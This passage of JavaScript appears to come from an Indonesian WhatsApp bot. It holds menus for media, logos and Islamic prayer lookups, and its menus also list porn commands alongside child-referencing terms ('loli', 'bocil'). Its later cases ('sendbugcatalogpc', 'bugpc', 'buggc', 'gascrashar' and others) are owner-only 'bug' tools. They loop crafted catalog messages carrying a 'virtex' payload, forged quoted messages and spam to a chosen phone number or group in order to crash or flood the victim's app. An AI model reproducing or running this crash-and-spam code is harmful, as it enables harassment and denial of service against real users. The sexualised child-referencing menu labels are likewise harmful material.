var rndm = ['pdf','zip','vnd.openxmlformats-officedocument.presentationml.presentation','vnd.openxmlformats-officedocument.spreadsheetml.sheet','vnd.openxmlformats-officedocument.wordprocessingml.document']
var bykir = rndm[Math.floor(Math.random() * rndm.length)]
memegnu = `*Hai Kak* ${pushname}

┌──『 𝐌𝐄𝐍𝐔 𝐕𝐈𝐃𝐄𝐎 』
☛ */Video*
☛${prefix}hentai
☛${prefix}porno
☛${prefix}asupan
☛${prefix}bocil
☛${prefix}rikagusriani
└──────`
let btn = [{
urlButton: {
displayText: "Instagram",
url: "https://www.instagram.com/ryarllh_01/", } },
{ 
quickReplyButton: { 
displayText: `Musik`, 
id: `${prefix}musik` } },
{ 
quickReplyButton: { 
displayText: `Loli`, 
id: `${prefix}loli` } },
{ 
quickReplyButton: { 
displayText: `Slebew`, 
id: `${prefix}slebew` } },
]
sock.send5ButLoc(m.chat, memegnu, `⚞ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`, btn)
}
addCmd(command.slice(0), 1, commund)
break
case 'menusuara':{
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
const botzkir = "6287741097274@s.whatsapp.net"
var rndm = ['pdf','zip','vnd.openxmlformats-officedocument.presentationml.presentation','vnd.openxmlformats-officedocument.spreadsheetml.sheet','vnd.openxmlformats-officedocument.wordprocessingml.document']
var bykir = rndm[Math.floor(Math.random() * rndm.length)]
memegnu = `*Hai Kak* ${pushname}

┌──『 𝐌𝐄𝐍𝐔 𝐒𝐎𝐔𝐍𝐃 』
☛⊱sound1
☛⊱sound2
☛⊱sound3
☛⊱sound4
☛⊱sound5
☛⊱sound6
☛⊱sound7
☛⊱sound8
☛⊱sound9
☛⊱sound10
☛⊱sound11
☛⊱sound12
☛⊱sound13
☛⊱sound14
☛⊱sound15
☛⊱sound16
☛⊱sound17
☛⊱sound18
☛⊱sound19
☛⊱sound20
☛⊱sound21
☛⊱sound22
☛⊱sound23
☛⊱sound24
☛⊱sound25
☛⊱sound26
☛⊱sound27
☛⊱sound28
☛⊱sound29
☛⊱sound30
☛⊱sound31
☛⊱sound32
☛⊱sound33
☛⊱sound34
☛⊱sound35
☛⊱sound36
☛⊱sound37
☛⊱sound38
☛⊱sound39
☛⊱sound40
☛⊱sound41
☛⊱sound42
☛⊱sound43
☛⊱sound44
☛⊱sound45
☛⊱sound46
☛⊱sound47
☛⊱sound48
☛⊱sound49
☛⊱sound50
☛⊱sound51
☛⊱sound52
☛⊱sound53
☛⊱sound54
☛⊱sound55
☛⊱sound56
☛⊱sound57
☛⊱sound58
☛⊱sound59
☛⊱sound60
☛⊱sound61
☛⊱sound62
☛⊱sound63
☛⊱sound64
☛⊱sound65
☛⊱sound66
☛⊱sound67
☛⊱sound68
☛⊱sound69
☛⊱sound70
☛⊱sound71
☛⊱sound72
☛⊱sound73
☛⊱sound74
☛⊱sound75
☛⊱sound76
☛⊱sound77
☛⊱sound78
☛⊱sound79
☛⊱sound80
☛⊱sound81
☛⊱sound82
☛⊱sound83
☛⊱sound84
☛⊱sound85
☛⊱sound86
☛⊱sound87
☛⊱sound88
☛⊱sound89
☛⊱sound90
☛⊱sound91
☛⊱sound92
☛⊱sound93
☛⊱sound94
☛⊱sound95
☛⊱sound96
☛⊱sound97
☛⊱sound98
☛⊱sound99
☛⊱sound100
☛⊱sound101
☛⊱sound102
☛⊱sound103
☛⊱sound104
☛⊱sound105
☛⊱sound106
☛⊱sound107
☛⊱sound108
☛⊱sound109
☛⊱sound110
☛⊱sound111
☛⊱sound112
☛⊱sound113
☛⊱sound114
☛⊱sound115
☛⊱sound116
☛⊱sound117
☛⊱sound118
☛⊱sound119
☛⊱sound120
☛⊱sound121
☛⊱sound122
☛⊱sound123
☛⊱sound124
☛⊱sound125
☛⊱sound126
☛⊱sound127
☛⊱sound128
☛⊱sound129
☛⊱sound130
☛⊱sound131
☛⊱sound132
☛⊱sound133
☛⊱sound134
☛⊱sound135
☛⊱sound136
☛⊱sound137
☛⊱sound138
☛⊱sound139
☛⊱sound140
☛⊱sound141
☛⊱sound142
☛⊱sound143
☛⊱sound144
☛⊱sound145
☛⊱sound146
☛⊱sound147
☛⊱sound148
☛⊱sound149
☛⊱sound150
☛⊱sound151
☛⊱sound152
☛⊱sound153
☛⊱sound154
☛⊱sound155
☛⊱sound156
☛⊱sound157
☛⊱sound158
☛⊱sound159
☛⊱sound160
☛⊱sound161
└──────`
let btn = [{
urlButton: {
displayText: "Instagram",
url: "https://www.instagram.com/ryarllh_01/", } },
{ 
quickReplyButton: { 
displayText: `Musik`, 
id: `${prefix}musik` } },
{ 
quickReplyButton: { 
displayText: `Loli`, 
id: `${prefix}loli` } },
{ 
quickReplyButton: { 
displayText: `Slebew`, 
id: `${prefix}slebew` } },
]
sock.send5ButLoc(m.chat, memegnu, `⚞ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`, btn)
}
addCmd(command.slice(0), 1, commund)
break
case 'menulogo':{
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
const botzkir = "6287741097274@s.whatsapp.net"
var rndm = ['pdf','zip','vnd.openxmlformats-officedocument.presentationml.presentation','vnd.openxmlformats-officedocument.spreadsheetml.sheet','vnd.openxmlformats-officedocument.wordprocessingml.document']
var bykir = rndm[Math.floor(Math.random() * rndm.length)]
memegnu = `*Hai Kak* ${pushname}

┌──『 𝐋𝐎𝐆𝐎 𝐌𝐄𝐍𝐔 』
☛ */Text Pro*
☛${prefix}candy teks
☛${prefix}christmas teks
☛${prefix}3dchristmas teks
☛${prefix}sparklechristmas teks
☛${prefix}deepsea teks
☛${prefix}scifi teks
☛${prefix}rainbow teks
☛${prefix}waterpipe teks
☛${prefix}spooky teks
☛${prefix}pencil teks
☛${prefix}circuit teks
☛${prefix}discovery teks
☛${prefix}metalic teks
☛${prefix}fiction teks
☛${prefix}demon teks
☛${prefix}transformer teks
☛${prefix}berry teks
☛${prefix}thunder teks
☛${prefix}magma teks
☛${prefix}3dstone teks
☛${prefix}neonlight teks
☛${prefix}glitch teks
☛${prefix}harrypotter teks
☛${prefix}brokenglass teks
☛${prefix}papercut teks
☛${prefix}watercolor teks
☛${prefix}multicolor teks
☛${prefix}neondevil teks
☛${prefix}underwater teks
☛${prefix}graffitibike teks
☛${prefix}snow teks
☛${prefix}cloud teks
☛${prefix}honey teks
☛${prefix}ice teks
☛${prefix}fruitjuice teks
☛${prefix}biscuit teks
☛${prefix}wood teks
☛${prefix}chocolate teks
☛${prefix}strawberry teks
☛${prefix}matrix teks
☛${prefix}blood teks
☛${prefix}dropwater teks
☛${prefix}toxic teks
☛${prefix}lava teks
☛${prefix}rock teks
☛${prefix}bloodglas teks
☛${prefix}hallowen teks
☛${prefix}darkgold teks
☛${prefix}joker teks
☛${prefix}wicker teks
☛${prefix}firework teks
☛${prefix}skeleton teks
☛${prefix}blackpink teks
☛${prefix}sand teks
☛${prefix}glue teks
☛${prefix}1917 teks
☛${prefix}leaves teks
☛${prefix}stoneeffect teks
└──────`
let btn = [{
urlButton: {
displayText: "Instagram",
url: "https://www.instagram.com/ryarllh_01/", } },
{ 
quickReplyButton: { 
displayText: `Musik`, 
id: `${prefix}musik` } },
{ 
quickReplyButton: { 
displayText: `Loli`, 
id: `${prefix}loli` } },
{ 
quickReplyButton: { 
displayText: `Slebew`, 
id: `${prefix}slebew` } },
]
sock.send5ButLoc(m.chat, memegnu, `⚞ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`, btn)
}
addCmd(command.slice(0), 1, commund)
break
case 'menupribadi':{
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
const botzkir = "6287741097274@s.whatsapp.net"
var rndm = ['pdf','zip','vnd.openxmlformats-officedocument.presentationml.presentation','vnd.openxmlformats-officedocument.spreadsheetml.sheet','vnd.openxmlformats-officedocument.wordprocessingml.document']
var bykir = rndm[Math.floor(Math.random() * rndm.length)]
memegnu = `*Hai Kak* ${pushname}

*Musik bang*`
let btn = [{
quickReplyButton: { 
displayText: `Pencet tombol ini`, 
id: `${prefix}menupribadi1` } },
]
sock.send5ButLoc(m.chat, memegnu, ` 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`, btn)
}
addCmd(command.slice(0), 1, commund)
break
case 'menupribadi1':{
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
memegnu = `*Hai Kak* ${pushname}

*Asikkkkk bang*`
let btn = [{
quickReplyButton: { 
displayText: `Rik`, 
id: `${prefix}rik` } },
{
quickReplyButton: { 
displayText: `Next`, 
id: `${prefix}menupribadi2` } },
]
sock.send5ButLoc(m.chat, memegnu, ` 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`, btn)
}
addCmd(command.slice(0), 1, commund)
break
case 'menupribadi2':{
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
memegnu = `*Hai Kak* ${pushname}

*Asikkkkk bang*`
let btn = [{
quickReplyButton: { 
displayText: `Cakep`, 
id: `${prefix}cakep` } },
{
quickReplyButton: { 
displayText: `Next`, 
id: `${prefix}menupribadi3` } },
]
sock.send5ButLoc(m.chat, memegnu, ` 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`, btn)
}
addCmd(command.slice(0), 1, commund)
break
case 'menupribadi3':{
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
memegnu = `*Hai Kak* ${pushname}

*Asikkkkk bang*`
let btn = [{
quickReplyButton: { 
displayText: `Sakit`, 
id: `${prefix}sakit` } },
{
quickReplyButton: { 
displayText: `Next`, 
id: `${prefix}menupribadi4` } },
]
sock.send5ButLoc(m.chat, memegnu, ` 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`, btn)
}
addCmd(command.slice(0), 1, commund)
break
case 'menupribadi4':{
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
memegnu = `*Hai Kak* ${pushname}

*Asikkkkk bang*`
let btn = [{
quickReplyButton: { 
displayText: `Ahhh`, 
id: `${prefix}ahh` } },
{
quickReplyButton: { 
displayText: `Next`, 
id: `${prefix}menupribadi5` } },
]
sock.send5ButLoc(m.chat, memegnu, ` 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`, btn)
}
addCmd(command.slice(0), 1, commund)
break
case 'menupribadi5':{
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
memegnu = `*Hai Kak* ${pushname}

*Asikkkkk bang*`
let btn = [{
quickReplyButton: { 
displayText: `Ngakak`, 
id: `${prefix}ngakak` } },
{
quickReplyButton: { 
displayText: `Next`, 
id: `${prefix}menupribadi6` } },
]
sock.send5ButLoc(m.chat, memegnu, ` 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`, btn)
}
addCmd(command.slice(0), 1, commund)
break
case 'menupribadi6':{
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
memegnu = `*Hai Kak* ${pushname}

*Asikkkkk bang*`
let btn = [{
quickReplyButton: { 
displayText: `Ketawa`, 
id: `${prefix}ketawa` } },
{
quickReplyButton: { 
displayText: `Next`, 
id: `${prefix}menupribadi7` } },
]
sock.send5ButLoc(m.chat, memegnu, ` 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`, btn)
}
addCmd(command.slice(0), 1, commund)
break
case 'menupribadi7':{
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
memegnu = `*Hai Kak* ${pushname}

*Asikkkkk bang*`
let btn = [{
quickReplyButton: { 
displayText: `Gatau`, 
id: `${prefix}gatau` } },
{
quickReplyButton: { 
displayText: `Next`, 
id: `${prefix}menupribadi8` } },
]
sock.send5ButLoc(m.chat, memegnu, ` 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`, btn)
}
addCmd(command.slice(0), 1, commund)
break
case 'menupribadi8':{
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
memegnu = `*Hai Kak* ${pushname}

*Asikkkkk bang*`
let btn = [{
quickReplyButton: { 
displayText: `Kocok`, 
id: `${prefix}kocok` } },
{
quickReplyButton: { 
displayText: `Next`, 
id: `${prefix}menupribadi9` } },
]
sock.send5ButLoc(m.chat, memegnu, ` 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`, btn)
}
addCmd(command.slice(0), 1, commund)
break
case 'menupribadi9':{
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
memegnu = `*Hai Kak* ${pushname}

*Asikkkkk bang*`
let btn = [{
quickReplyButton: { 
displayText: `Minggir`, 
id: `${prefix}minggir` } },
{
quickReplyButton: { 
displayText: `Next`, 
id: `${prefix}menupribadi10` } },
]
sock.send5ButLoc(m.chat, memegnu, ` 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`, btn)
}
addCmd(command.slice(0), 1, commund)
break
case 'menupribadi10':{
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
memegnu = `*Hai Kak* ${pushname}

*Asikkkkk bang*`
let btn = [{
quickReplyButton: { 
displayText: `Wibu`, 
id: `${prefix}loli` } },
{
quickReplyButton: { 
displayText: `Next`, 
id: `${prefix}menupribadi11` } },
]
sock.send5ButLoc(m.chat, memegnu, ` 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`, btn)
}
addCmd(command.slice(0), 1, commund)
break
case 'menupribadi11':{
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
memegnu = `*Hai Kak* ${pushname}

*Asikkkkk bang*`
let btn = [{
quickReplyButton: { 
displayText: `Asik`, 
id: `${prefix}asik` } },
{
quickReplyButton: { 
displayText: `Next`, 
id: `${prefix}menupribadi12` } },
]
sock.send5ButLoc(m.chat, memegnu, ` 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`, btn)
}
addCmd(command.slice(0), 1, commund)
break
case 'menupribadi12':{
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
memegnu = `*Hai Kak* ${pushname}

*Asikkkkk bang*`
let btn = [{
quickReplyButton: { 
displayText: `Bang`, 
id: `${prefix}bang` } },
{
quickReplyButton: { 
displayText: `Next`, 
id: `${prefix}menupribadi13` } },
]
sock.send5ButLoc(m.chat, memegnu, ` 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`, btn)
}
addCmd(command.slice(0), 1, commund)
break
case 'menupribadi13':{
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
memegnu = `*Hai Kak* ${pushname}

*Asikkkkk bang*`
let btn = [{
quickReplyButton: { 
displayText: `Musik`, 
id: `${prefix}musik` } },
{
quickReplyButton: { 
displayText: `Next`, 
id: `${prefix}menupribadi14` } },
]
sock.send5ButLoc(m.chat, memegnu, ` 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`, btn)
}
addCmd(command.slice(0), 1, commund)
break
case 'menupribadi14':{
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
memegnu = `*Hai Kak* ${pushname}

*Asikkkkk bang*`
let btn = [{
quickReplyButton: { 
displayText: `Mastah`, 
id: `${prefix}mastah` } },
{
quickReplyButton: { 
displayText: `Next`, 
id: `${prefix}menupribadi15` } },
]
sock.send5ButLoc(m.chat, memegnu, ` 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`, btn)
}
addCmd(command.slice(0), 1, commund)
break
case 'menupribadi15':{
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
memegnu = `*Hai Kak* ${pushname}

*Asikkkkk bang*`
let btn = [{
quickReplyButton: { 
displayText: `Slebew`, 
id: `${prefix}slebew` } },
{
quickReplyButton: { 
displayText: `Next`, 
id: `${prefix}menupribadi16` } },
]
sock.send5ButLoc(m.chat, memegnu, ` 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`, btn)
}
addCmd(command.slice(0), 1, commund)
break
case 'menupribadi16':{
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
memegnu = `*Hai Kak* ${pushname}

*Asikkkkk bang*`
let btn = [{
quickReplyButton: { 
displayText: `Kesel`, 
id: `${prefix}kesel` } },
{
quickReplyButton: { 
displayText: `Next`, 
id: `${prefix}menupribadi17` } },
]
sock.send5ButLoc(m.chat, memegnu, ` 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`, btn)
}
addCmd(command.slice(0), 1, commund)
break
case 'menupribadi17':{
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
memegnu = `*Hai Kak* ${pushname}

*Asikkkkk bang*`
let btn = [{
quickReplyButton: { 
displayText: `Ngeselin`, 
id: `${prefix}ngeselin` } },
]
sock.send5ButLoc(m.chat, memegnu, ` 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`, btn)
}
addCmd(command.slice(0), 1, commund)
break
case 'kisahnabi':{
if (!q) return reply(`Contoh ${prefix+command} adam`)
dsh = await fetchJson(`https://kirbotz-api.herokuapp.com/api/kisahnabi?nabi=${q}&apikey=${kirkey}`)
reply(`Nama : ${dsh.result.name}
Kelahiran : ${dsh.result.kelahiran}
Wafat Usia : ${dsh.result.wafat_usia}
Singgah : ${dsh.result.singgah}
Kisah :
${dsh.result.kisah}`)
}
break
case 'listsurah':{
if (!isRegistered) return replyReg(api.verif)

if (isBan) return reply(api.ban)
mke = await listsurah()
reply(`*/ List Surah \\*

Author : ${mke.author}
ListSurah :
${mke.listsurah}`)
}
addCmd(command.slice(0), 1, commund)
break
case 'niatsholat':
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
if (!q) return reply(`Contoh ${prefix+command} isya
List Nya
shubuh
dzuhur
ashar
magribh
isya`)
ysehh = await niatsholat(`${q}`)
reply(`Name : ${ysehh.name}
Arabic : ${ysehh.arabic}
Latin : ${ysehh.latin}
Terjemahan: ${ysehh.terjemahan}`)
addCmd(command.slice(0), 1, commund)
break
case 'asmaulhusna':
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
yseh = await asmaulhusna()
reply(`Nomor : ${yseh.nomor}
Latin : ${yseh.latin}
Arabic : ${yseh.arabic}
Indonesia : ${yseh.id}
English : ${yseh.en}`)
addCmd(command.slice(0), 1, commund)
break
case 'jadwalsholat':{
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
if (!q) return reply(`Contoh ${prefix+command} Tasikmalaya`)
kfn = await jadwalsholat(`${q}`)
reply(`Kota : ${q}
Tanggal : ${kfn.tanggal}
Imsyak : ${kfn.imsyak}
Shubuh : ${kfn.subuh}
Dzuhur : ${kfn.dzuhur}
Ashar : ${kfn.ashar}
Magribh : ${kfn.maghrib}
Isya : ${kfn.isya}`)
}
addCmd(command.slice(0), 1, commund)
break
case 'bacaanshalat':
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
dehe = await bacaanshalat()
reply(`Nomor : ${dehe.nomor}
Name : ${dehe.name}
Arabic : ${dehe.arabic}
Latin : ${dehe.latin}
Terjemahan : ${dehe.terjemahan}`)
addCmd(command.slice(0), 1, commund)
break
case 'addowner':
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
if (!isCreator) return reply(api.owner)
if (!args[0]) return reply(`Contoh ${prefix+command} 628×××××`)
bnnd = `${args[0].replace('@', '')}`
owner.push(bnnd)
fs.writeFileSync('./command/Database/owner.json', JSON.stringify(owner))
reply(`Nomor ${bnnd} Telah Menjadi Owner!!!`)
addCmd(command.slice(0), 1, commund)
break
case 'delowner':
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
if (!isCreator) return reply(api.owner)
if (!args[0]) return reply(`Contoh ${prefix+command} 628×××××`)
ya = `${args[0].replace('@', '')}`
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./command/Database/owner.json', JSON.stringify(owner))
reply(`Nomor ${ya} Telah Di Hapus Owner!!!`)
addCmd(command.slice(0), 1, commund)
break
case 'bcall': {
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
if (!isCreator) return reply(api.owner)
if (!m.quoted) return reply("Reply pesan yang ingin di broadcast!")
let anu = await store.chats.all().map(v => v.id)
reply(`Mengirim Broadcast Ke ${anu.length} Chat\nWaktu Selesai ${anu.length * 1.5} detik`)
for (let yoi of anu) {
await sleep(1500)
quoted.copyNForward(yoi, true, {quoted:m})
}
reply('Sukses Broadcast')
}
break
case 'dashboard': {
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
var jumlahCmd = commund.length
if (jumlahCmd > 10) jumlahCmd = 10
teks = `*「 Total Hit Command 」*\nGlobal Hit : ${totalhit}\nToday Hit : ${hit_today.length}\n\n*Most Command Global*`
for (let i = 0; i < jumlahCmd ; i ++) {
teks += `\n » Command : ${commund[i].id}, ${commund[i].total} used`
}
reply(teks) 
}
addCmd(command.slice(0), 1, commund)
break
case 'report': {
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
if (!args.join(" ")) return reply(`Example : \n- ${prefix + command} fitur ig error min\n- ${prefix + command} user ini nyepam min`)
teks = `*| REPORT FITUR |*`
teks1 = `\n\nNomor : @${m.sender.split("@")[0]}\nReport : ${args.join(" ")}`
teks2 = `\n\nSucces send to owner`
for (let i of owner) {
sock.sendMessage(i + "@s.whatsapp.net", {text: teks + teks1, mentions:[m.sender]}, {quoted:m})
}
sock.sendMessage(m.chat, {text: teks + teks2 + teks1, mentions:[m.sender]}, {quoted:m})
}
addCmd(command.slice(0), 1, commund)
break
case 'sendbugcatalogpc': {
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
if (!isCreator) return reply(api.owner)
if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} number|amount spam|timer\nExample : ${command} 62888|1|10s\n\n\ns = Second/Detik`)
num = q.split('|')[0]+'@s.whatsapp.net'
jumlah = q.split('|')[1]
waktu = q.split('|')[2]
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: ktedh }, { upload: sock.waUploadToServer })
var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "7091718154232528",
"title": `Tes doang kak`,
"description": `${virtex10}`,
"currencyCode": "IDR",
"priceAmount1000": "100000000000000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "1000",
"retailerId": `Nomor Owner Di Atas`,
"url": `https://wa.me/6287741097274`
},
"businessOwnerJid": "6287741097274@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: lep  })
sock.relayMessage(num, catalog.message, { messageId: catalog.key.id })
await sleep(ms(waktu))
}
reply(`Bug 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`)
}
break
case 'bugpc2': {
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
if (!isCreator) return reply(api.owner)
if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} number|amount spam|timer\nExample : ${command} 62888|1|10s\n\n\ns = Second/Detik`)
num = q.split('|')[0]+'@s.whatsapp.net'
jumlah = q.split('|')[1]
waktu = q.split('|')[2]
for (let i = 0; i < jumlah; i++) {
sock.sendMessage(num, { sticker: thumb }, { quoted: lep})
await sleep(ms(waktu))
}
tek = `Success Send Bug To: ${num}\nAmount Spam: ${jumlah}\nTimer: ${waktu}`
reply(tek)
}
addCmd(command.slice(0), 1, commund)
break
case 'bugpc': {
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
if (!isCreator) return reply(api.owner)
if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} number|amount spam|timer\nExample : ${command} 62888|1|10s\n\n\ns = Second/Detik`)
num = q.split('|')[0]+'@s.whatsapp.net'
jumlah = q.split('|')[1]
waktu = q.split('|')[2]
for (let i = 0; i < jumlah; i++) {
sock.sendMessage(num, { text: '☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳' }, { quoted: lep})
await sleep(ms(waktu))
}
tek = `Success Send Bug To: ${num}\nAmount Spam: ${jumlah}\nTimer: ${waktu}`
reply(tek)
}
addCmd(command.slice(0), 1, commund)
break
case 'buggc': {
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
if (!isCreator) return reply(api.owner)
if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} idGroup|amount spam|timer\nExample : ${command} 62888@g.us|1|10s\n\n\ns = Second/Detik\n\nDi Usahakan Bot Udah Masuk Group Nya`)
num = q.split('|')[0]
jumlah = q.split('|')[1]
waktu = q.split('|')[2]
for (let i = 0; i < jumlah; i++) {
sock.sendMessage(num, { text: 'Halo Guys Aku 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳 Kang Bug' }, { quoted: lep})
await sleep(ms(waktu))
}
tekteka = `Success Send Bug To: ${num}\nAmount Spam: ${jumlah}\nTimer: ${waktu}`
reply(tekteka)
}
addCmd(command.slice(0), 1, commund)
break
case 'sendbug':{
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
if (!isCreator) return reply(api.owner)
if (!q) return reply(`Contoh\n${prefix+command} 628×××××`)
let nonye = [`${q}`]
teks = `*☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳 Hard LeveL*`
teks1 = `\n☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`
for (let i of nonye) {
sock.sendMessage(i + "@s.whatsapp.net", {text: teks + teks1, mentions:[m.sender]}, {quoted:lep})
}
sock.sendMessage(m.chat, {text: `Sukses`, mentions:[m.sender]}, {quoted:m})
}
addCmd(command.slice(0), 1, commund)
break
case 'gasbro':
                if (!isCreator) throw sticOwner(mess.owner)
                if (!text) throw `MANA NOMERNYA BANG`
                gasbugpc = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
                sock.sendMessage(`${text}@s.whatsapp.net`, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:gasbugpc})
                m.reply(`succes`)

                break
case 'gascrashar':               
if (!isCreator) throw sticOwner(from)
          if (!text) throw `MANA NOMERNYA BANG`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
            await sock.sendMessage(`${text}@s.whatsapp.net`, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:asukonyol11})
            await sock.sendMessage(`${text}@s.whatsapp.net`, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:asukonyol11})
            await sock.sendMessage(`${text}@s.whatsapp.net`, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:asukonyol11})
            await sock.sendMessage(`${text}@s.whatsapp.net`, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:asukonyol11})
            await sock.sendMessage(`${text}@s.whatsapp.net`, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:asukonyol11})
            await sock.sendMessage(`${text}@s.whatsapp.net`, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:asukonyol11})
            await sock.sendMessage(`${text}@s.whatsapp.net`, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:asukonyol11})
            await sock.sendMessage(`${text}@s.whatsapp.net`, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:asukonyol11})
            await sock.sendMessage(`${text}@s.whatsapp.net`, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:asukonyol11})
            await sock.sendMessage(`${text}@s.whatsapp.net`, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:asukonyol11})
            await sock.sendMessage(`${text}@s.whatsapp.net`, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:asukonyol11})
            await sock.sendMessage(`${text}@s.whatsapp.net`, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:asukonyol11})
            await sock.sendMessage(`${text}@s.whatsapp.net`, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:asukonyol11})
            await sock.sendMessage(`${text}@s.whatsapp.net`, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:asukonyol11})
            await sock.sendMessage(`${text}@s.whatsapp.net`, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:asukonyol11})
            await sock.sendMessage(`${text}@s.whatsapp.net`, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:asukonyol11})
            await sock.sendMessage(`${text}@s.whatsapp.net`, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:asukonyol11})
            await sock.sendMessage(`${text}@s.whatsapp.net`, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:asukonyol11})
